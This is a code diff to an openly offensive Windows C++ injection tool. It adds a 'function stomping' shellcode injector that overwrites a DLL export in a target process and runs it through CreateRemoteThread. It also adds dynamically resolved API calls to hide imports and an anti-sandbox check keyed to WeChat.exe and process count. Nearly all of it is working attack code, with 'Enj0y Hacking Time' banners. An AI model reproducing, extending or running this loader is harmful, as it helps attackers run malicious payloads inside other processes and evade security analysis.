@@ -1,5 +1,6 @@
 #include<iostream>
 #include<tchar.h>
+#include<string>
 #include<Windows.h>
 #include<memoryapi.h>
 #include<Tlhelp32.h>
@@ -9,6 +10,7 @@ using namespace std;
 
 typedef struct Initialization
 {
+	Fn_VirtualProtectEx			Hide_VirtualProtectEx;
 	Fn_CreateFileMappingW		Hide_CreateFileMappingW;
 	Fn_ResumeThread				Hide_ResumeThread;
 	Fn_SetThreadContext         Hide_SetThreadContext;
@@ -26,42 +28,52 @@ typedef struct Initialization
 	Fn_WriteProcessMemory		Hide_WriteProcessMemory;
 	Fn_MapViewOfFile            Hide_MapViewOfFile;
 	Fn_WaitForSingleObject      Hide_WaitForSingleObject;
-	Fn_MapViewOfFile2           Hide_MapViewOfFile2;
+	Fn_LoadLibraryW				Hide_LoadLibraryW;
 }Initialization;
 
 Initialization func = { 0 };
 
 BOOL Win32()
 {
-	HMODULE hKernel32					= GetModuleHandleW(L"Kernel32.dll");
-	func.Hide_WaitForSingleObject		= (Fn_WaitForSingleObject)GetProcAddress(hKernel32, "WaitForSingleObject");
-	func.Hide_CreateFileMappingW		= (Fn_CreateFileMappingW)GetProcAddress(hKernel32, "CreateFileMappingW");
-	func.Hide_ResumeThread				= (Fn_ResumeThread)GetProcAddress(hKernel32, "ResumeThread");
-	func.Hide_SetThreadContext			= (Fn_SetThreadContext)GetProcAddress(hKernel32, "SetThreadContext");
-	func.Hide_GetThreadContext			= (Fn_GetThreadContext)GetProcAddress(hKernel32, "GetThreadContext");
-	func.Hide_SuspendThread				= (Fn_SuspendThread)GetProcAddress(hKernel32, "SuspendThread");
-	func.Hide_CreateToolhelp32Snapshot  = (Fn_CreateToolhelp32Snapshot)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
-	func.Hide_OpenThread				= (Fn_OpenThread)GetProcAddress(hKernel32, "OpenThread");
-	func.Hide_CreateRemoteThread		= (FN_CreateRemoteThread)GetProcAddress(hKernel32, "CreateRemoteThread");
-	func.Hide_ReadFile					= (Fn_ReadFile)GetProcAddress(hKernel32, "ReadFile");
-	func.Hide_GetFileSize				= (Fn_GetFileSize)GetProcAddress(hKernel32, "GetFileSize");
-	func.Hide_CreateFileW				= (Fn_CreateFileW)GetProcAddress(hKernel32, "CreateFileW");
-	func.Hide_OpenProcess				= (Fn_OpenProcess)GetProcAddress(hKernel32, "OpenProcess");
-	func.Hide_QueueUserAPC				= (Fn_QueueUserAPC)GetProcAddress(hKernel32, "QueueUserAPC");
-	func.Hide_VirtualAllocEx			= (Fn_VirtualAllocEx)GetProcAddress(hKernel32, "VirtualAllocEx");
-	func.Hide_WriteProcessMemory		= (Fn_WriteProcessMemory)GetProcAddress(hKernel32, "WriteProcessMemory");
-	func.Hide_MapViewOfFile				= (Fn_MapViewOfFile)GetProcAddress(hKernel32, "MapViewOfFile");
-
-	if (func.Hide_CreateFileMappingW && func.Hide_CreateFileW &&func.Hide_CreateRemoteThread &&func.Hide_CreateToolhelp32Snapshot 
-	  &&func.Hide_GetFileSize && func.Hide_GetThreadContext && func.Hide_MapViewOfFile
-	  &&func.Hide_OpenProcess &&func.Hide_OpenThread && func.Hide_QueueUserAPC &&func.Hide_ReadFile
-	  &&func.Hide_ResumeThread &&func.Hide_SetThreadContext &&func.Hide_SuspendThread &&func.Hide_VirtualAllocEx
-	  &&func.Hide_WaitForSingleObject &&func.Hide_WriteProcessMemory)
+	HMODULE hKernel32 = GetModuleHandleW(L"Kernel32.dll");
+	func.Hide_VirtualProtectEx = (Fn_VirtualProtectEx)GetProcAddress(hKernel32, "VirtualProtectEx");
+	func.Hide_WaitForSingleObject = (Fn_WaitForSingleObject)GetProcAddress(hKernel32, "WaitForSingleObject");
+	func.Hide_CreateFileMappingW = (Fn_CreateFileMappingW)GetProcAddress(hKernel32, "CreateFileMappingW");
+	func.Hide_ResumeThread = (Fn_ResumeThread)GetProcAddress(hKernel32, "ResumeThread");
+	func.Hide_SetThreadContext = (Fn_SetThreadContext)GetProcAddress(hKernel32, "SetThreadContext");
+	func.Hide_GetThreadContext = (Fn_GetThreadContext)GetProcAddress(hKernel32, "GetThreadContext");
+	func.Hide_SuspendThread = (Fn_SuspendThread)GetProcAddress(hKernel32, "SuspendThread");
+	func.Hide_CreateToolhelp32Snapshot = (Fn_CreateToolhelp32Snapshot)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
+	func.Hide_OpenThread = (Fn_OpenThread)GetProcAddress(hKernel32, "OpenThread");
+	func.Hide_CreateRemoteThread = (FN_CreateRemoteThread)GetProcAddress(hKernel32, "CreateRemoteThread");
+	func.Hide_ReadFile = (Fn_ReadFile)GetProcAddress(hKernel32, "ReadFile");
+	func.Hide_GetFileSize = (Fn_GetFileSize)GetProcAddress(hKernel32, "GetFileSize");
+	func.Hide_CreateFileW = (Fn_CreateFileW)GetProcAddress(hKernel32, "CreateFileW");
+	func.Hide_OpenProcess = (Fn_OpenProcess)GetProcAddress(hKernel32, "OpenProcess");
+	func.Hide_QueueUserAPC = (Fn_QueueUserAPC)GetProcAddress(hKernel32, "QueueUserAPC");
+	func.Hide_VirtualAllocEx = (Fn_VirtualAllocEx)GetProcAddress(hKernel32, "VirtualAllocEx");
+	func.Hide_WriteProcessMemory = (Fn_WriteProcessMemory)GetProcAddress(hKernel32, "WriteProcessMemory");
+	func.Hide_MapViewOfFile = (Fn_MapViewOfFile)GetProcAddress(hKernel32, "MapViewOfFile");
+	func.Hide_LoadLibraryW = (Fn_LoadLibraryW)GetProcAddress(hKernel32, "LoadLibraryW");
+	if (func.Hide_CreateFileMappingW && func.Hide_CreateFileW && func.Hide_CreateRemoteThread && func.Hide_CreateToolhelp32Snapshot
+		&& func.Hide_GetFileSize && func.Hide_GetThreadContext && func.Hide_MapViewOfFile
+		&& func.Hide_OpenProcess && func.Hide_OpenThread && func.Hide_QueueUserAPC && func.Hide_ReadFile
+		&& func.Hide_ResumeThread && func.Hide_SetThreadContext && func.Hide_SuspendThread && func.Hide_VirtualAllocEx
+		&& func.Hide_WaitForSingleObject && func.Hide_WriteProcessMemory && func.Hide_LoadLibraryW && func.Hide_VirtualProtectEx)
 		return TRUE;
 	else
 		return FALSE;
 }
 
+
+WCHAR* CharToWchar(char* str)
+{
+	int charLength = (int)(strlen(str) + 1); // +1 for null terminator
+	int wcharLength = MultiByteToWideChar(CP_ACP, 0, str, charLength, NULL, 0);
+	wchar_t* wcharString = (wchar_t*)calloc(wcharLength * sizeof(wchar_t), 2);
+	MultiByteToWideChar(CP_ACP, 0, str, charLength, wcharString, wcharLength);
+	return wcharString;
+}
 
 BOOL EnableDebugPrivilege()
 {
@@ -333,18 +345,107 @@ BOOL TraverseProcess(LPCWSTR ProcessName)
 
 	return TRUE;
 }
+void FunctionStomping(LPCWSTR targetName, LPCWSTR binFile)
+{
+	char		dllName[MAX_PATH];
+	char		functionName[MAX_PATH];
+	SIZE_T      realLength = 0;
+	DWORD		fileSize = 0;
+	DWORD		targetProcessPID = 0;
+	HANDLE      targetHandle = INVALID_HANDLE_VALUE;
+	HANDLE      fileHandle = INVALID_HANDLE_VALUE;
+	HANDLE      hProcess = INVALID_HANDLE_VALUE;
+	PVOID       stompAddress = NULL;
+	PVOID       fileBuffer = NULL;
+
+	cout << "	[!] Which Dll's Function Do You Wanna Stomping" << endl;
+	cin >> dllName >> functionName;
+	WCHAR* convertName = CharToWchar(dllName);
+
+	targetProcessPID = GetProcessPID(targetName);
+	if (targetProcessPID == 0)
+	{
+		cout << "	[-] Get Target ProcessPID Failed :(" << endl;
+		goto END;
+	}
+	else
+		cout << "	[+] Get Target ProcessPID Successfully" << endl;
+
+	fileHandle = func.Hide_CreateFileW(binFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	if (fileHandle == INVALID_HANDLE_VALUE)
+		goto END;
+	fileSize = func.Hide_GetFileSize(fileHandle, NULL);
+	if (fileSize == 0)
+		goto END;
+	fileBuffer = malloc(fileSize);
+	if (fileBuffer == NULL)
+		goto END;
+	if (!func.Hide_ReadFile(fileHandle, fileBuffer, fileSize, NULL, NULL))
+		goto END;
+	cout << "	[+] Read Bin File Into Memory Successfully :)" << endl;
+
+	func.Hide_LoadLibraryW(convertName);
+	stompAddress = GetProcAddress(GetModuleHandleW(convertName), functionName);
+	if (stompAddress == NULL)
+	{
+		cout << "	[-] Get Stomp Address Failed :(" << endl;
+		goto END;
+	}
+	else
+		cout << "	[+] Get Stomp Address Successfully :)" << endl;
+
+	targetHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessPID);
+	if (targetHandle == INVALID_HANDLE_VALUE)
+	{
+		cout << "	[-] Open Target Process Failed :( " << endl;
+		goto END;
+	}
+	else
+		cout << "	[+] Open Target Process Successfully :)" << endl;
+
+	func.Hide_VirtualProtectEx(targetHandle, stompAddress, fileSize, PAGE_READWRITE, NULL);
+
+	if (!WriteProcessMemory(targetHandle, stompAddress, fileBuffer, fileSize, &realLength))
+	{
+		cout << "	[-] Write Process Memory Failed :(" << endl;
+		goto END;
+	}
+	else
+		cout << "	[+] Write Process Memroy Successfully :)" << endl;
+
+	func.Hide_VirtualProtectEx(targetHandle, stompAddress, fileSize, PAGE_EXECUTE_READWRITE, NULL);
+
+	hProcess = func.Hide_CreateRemoteThread(targetHandle, NULL, NULL, (LPTHREAD_START_ROUTINE)stompAddress, NULL, NULL, NULL);
+	if (hProcess == INVALID_HANDLE_VALUE)
+	{
+		cout << "	[-] Create Remote Thread Failed :(" << endl;
+		goto END;
+	}
+	else
+		cout << "	[+] Create Remote Thread Successfully :)" << endl;
+
+	cout << "	[+] Function St&mping Successfully !! Enj0y Hacking Time :) !" << endl;
+	CloseHandle(hProcess);
+	CloseHandle(targetHandle);
+	CloseHandle(fileHandle);
+END:
+	CloseHandle(hProcess);
+	CloseHandle(targetHandle);
+	CloseHandle(fileHandle);
+}
 
 void MappingInject(LPCWSTR targetProcess, LPCWSTR binFile)
 {
-	DWORD    fileSize			     = 0;
-	PVOID    fileBuffer			     = NULL;
-	PVOID    pMapAddress			 = NULL;
-	PVOID    remoteMemory			 = NULL;
-	HANDLE   targetHandle			 = INVALID_HANDLE_VALUE;
-	HANDLE   fileHandle				 = INVALID_HANDLE_VALUE;
-	HANDLE   tempHandle				 = INVALID_HANDLE_VALUE;
-	HANDLE   mapAddressHandle		 = INVALID_HANDLE_VALUE;
-	HANDLE   hProcess				 = INVALID_HANDLE_VALUE;
+	DWORD    fileSize = 0;
+	PVOID    fileBuffer = NULL;
+	PVOID    pMapAddress = NULL;
+	PVOID    remoteMemory = NULL;
+	HANDLE   targetHandle = INVALID_HANDLE_VALUE;
+	HANDLE   fileHandle = INVALID_HANDLE_VALUE;
+	HANDLE   tempHandle = INVALID_HANDLE_VALUE;
+	HANDLE   mapAddressHandle = INVALID_HANDLE_VALUE;
+	HANDLE   hProcess = INVALID_HANDLE_VALUE;
 
 	typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
 		PHANDLE ThreadHandle,
@@ -392,8 +493,8 @@ void MappingInject(LPCWSTR targetProcess, LPCWSTR binFile)
 	else
 		cout << "	[+] Create Mapping Object Successfully :)" << endl;
 
-	pMapAddress = func.Hide_MapViewOfFile(tempHandle,  FILE_MAP_WRITE, 0, 0, fileSize);
-	
+	pMapAddress = func.Hide_MapViewOfFile(tempHandle, FILE_MAP_WRITE, 0, 0, fileSize);
+
 	if (pMapAddress == NULL)
 	{
 		cout << "	[-] Mapping Into Temp Memory Failed :(" << endl;
@@ -402,16 +503,18 @@ void MappingInject(LPCWSTR targetProcess, LPCWSTR binFile)
 	else
 		cout << "	[+] Mapping Into Temp Memory Successfully :)" << endl;
 
+
 	memcpy(pMapAddress, fileBuffer, fileSize);
-	
+
 	targetHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessPID(targetProcess));
-	if (targetHandle == INVALID_HANDLE_VALUE)
+	if (targetHandle == INVALID_HANDLE_VALUE || GetLastError() == 87)
 	{
 		cout << "	[-] Get Target Handle Failed :(" << endl;
 		goto END;
 	}
 	else
 		cout << "	[+] Get Target Handle Successfully :)" << endl;
+
 
 	remoteMemory = MapViewOfFile2(tempHandle, targetHandle, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
 	if (remoteMemory == NULL)
@@ -423,14 +526,14 @@ void MappingInject(LPCWSTR targetProcess, LPCWSTR binFile)
 		cout << "	[+] Mapping Into Remote Memory Successfully :)" << endl;
 
 	//hProcess = CreateRemoteThread(targetHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
-	if (ZwCreateThreadEx(&hProcess, PROCESS_ALL_ACCESS, NULL, targetHandle, (LPTHREAD_START_ROUTINE)remoteMemory , 0, 0, 0, 0, 0, NULL))
+	if (ZwCreateThreadEx(&hProcess, PROCESS_ALL_ACCESS, NULL, targetHandle, (LPTHREAD_START_ROUTINE)remoteMemory, 0, 0, 0, 0, 0, NULL))
 	{
 		cout << "	[-] Create Remote Thread Failed :(" << endl;
 		goto END;
 	}
 	else
 		cout << "	[+] Create Remote Thread Successfully :)" << endl;
-	
+
 	CloseHandle(targetHandle);
 	CloseHandle(fileHandle);
 	CloseHandle(tempHandle);
@@ -447,8 +550,6 @@ END:
 
 void DLLInject(DWORD pid, LPCWSTR dllpath)
 {
-
-
 	HANDLE OriginalProcessHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	if (OriginalProcessHandle == NULL)
 	{
@@ -540,7 +641,7 @@ void Banner(int type)
 	if (type == 1)
 	{
 		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
-		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_BLUE);
+		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
 		std::cout << "________  .____    .____      .___            __               __   \n"
 			"\\______ \\ |    |   |    |     |   | ____     |__| ____   _____/  |_ \n"
 			" |    |  \\|    |   |    |     |   |/    \\    |  |/ __ \\_/ ___\\   __\\\n"
@@ -594,6 +695,20 @@ void Banner(int type)
 		std::cout << "        \\/     \\/|__|   |__|           \\/     \\/            \\/\\______|    \\/     \\/       \n";
 		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
 	}
+	else if (type == 5)
+	{
+		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN);
+		std::cout << R"(
+ ___________                   __  .__                  _________ __                        .__                
+ \_   _____/_ __  ____   _____/  |_|__| ____   ____    /   _____//  |_  ____   _____ ______ |__| ____    ____  
+  |    __)|  |  \/    \_/ ___\   __\  |/  _ \ /    \   \_____  \\   __\/  _ \ /     \\____ \|  |/    \  / ___\ 
+  |     \ |  |  /   |  \  \___|  | |  (  <_> )   |  \  /        \|  | (  <_> )  Y Y  \  |_> >  |   |  \/ /_/  >
+  \___  / |____/|___|  /\___  >__| |__|\____/|___|  / /_______  /|__|  \____/|__|_|  /   __/|__|___|  /\___  / 
+      \/             \/     \/                    \/          \/                   \/|__|           \//_____/
+)" << std::endl;
+		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
+	}
 	cout << endl << "	    Under the sun,there is no secure system!!" << endl << "	        Scripted By Whoami@127.0.0.1  :》" << endl << "	          Color Picked By Icy Water :)" << endl;
 	if (EnableDebugPrivilege() == TRUE)
 	{
@@ -605,7 +720,39 @@ void Banner(int type)
 		cout << "-----------------------------!!START!!--------------------------------" << endl;
 		cout << "	[-] Privilege Elevated Failed, You Haven't Bypassed UAC :( " << endl;
 	}
-	
+
+}
+BOOL AntiSandBox()
+{
+	DWORD Ret = 0;
+	PROCESSENTRY32 p32;
+	HANDLE lpSnapshot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (lpSnapshot == INVALID_HANDLE_VALUE)
+	{
+		printf("	[-] 获取进程快照失败,请重试! Error:%d", ::GetLastError());
+		return Ret;
+	}
+	p32.dwSize = sizeof(PROCESSENTRY32);
+	::Process32First(lpSnapshot, &p32);
+	int cnt = 1;
+	int checkWechatExit = 0;
+	do {
+		cnt++;
+		std::wstring processName(p32.szExeFile);
+		if (processName == L"WeChat.exe")
+		{
+			checkWechatExit = 1;
+		}
+	} while (Process32Next(lpSnapshot, &p32));
+
+	if (checkWechatExit == 0)
+	{
+		return 0;
+	}
+	else
+	{
+		return cnt > 100;
+	}
 }
 
 void TrashData()
@@ -626,9 +773,11 @@ void TrashData()
 int _tmain(int argc, TCHAR* argv[])
 {
 	if (argc == 3) {
+
 		cout << "	Which kind of Injection do you want?" << endl;
 		cout << "	[1]: DLLInject" << endl << "	[2]: APCInject" << endl;
 		cout << "	[3]: ThreadHiJacking" << endl << "	[4]: MappingInject" << endl;
+		cout << "	[5]: FunctionStomping" << endl;
 		int type = 0;
 		cin >> type;
 		Banner(type);
@@ -636,7 +785,18 @@ int _tmain(int argc, TCHAR* argv[])
 			cout << "	[+] Dynamic Call Successfully :)" << endl;
 		else
 		{
+			TrashData();
+			std::cout << "\033[2J\033[1;1H";
 			cout << "	[-] Dynamic Call Failed :(" << endl;
+			return 0;
+		}
+		if (AntiSandBox())
+			cout << "	[+] Anti SandBox Successfully :)" << endl;
+		else
+		{
+			TrashData();
+			std::cout << "\033[2J\033[1;1H"<<endl<<endl<<endl;
+			cout << "	[-] Don't Run This In SandBox Or Virtual Machine :(" << endl;
 			return 0;
 		}
 		if (type == 1) //DLLInject
@@ -661,6 +821,10 @@ int _tmain(int argc, TCHAR* argv[])
 		else if (type == 4)  //Remote Mapping Inject 
 		{
 			MappingInject(argv[1], argv[2]);
+		}
+		else if (type == 5)
+		{
+			FunctionStomping(argv[1], argv[2]);
 		}
 		else {
 			TrashData();
